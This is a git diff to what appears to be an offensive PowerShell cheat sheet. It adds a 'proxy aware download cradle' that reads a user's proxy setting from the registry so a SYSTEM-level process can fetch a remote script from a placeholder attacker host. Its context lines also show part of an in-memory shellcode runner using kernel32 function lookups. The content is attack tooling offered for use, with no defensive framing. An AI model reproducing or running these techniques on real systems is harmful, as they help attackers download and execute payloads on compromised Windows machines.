@@ -329,7 +329,14 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
 
-
-
+12. Full code for SYSTEM integrity proxy aware download cradle
+```
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+$keys = Get-ChildItem 'HKU:\' 
+ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
+$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
+$wc = (New-Object Net.WebClient).DownloadString('http://X.X.X.X/run2.ps1')
+```
 
 
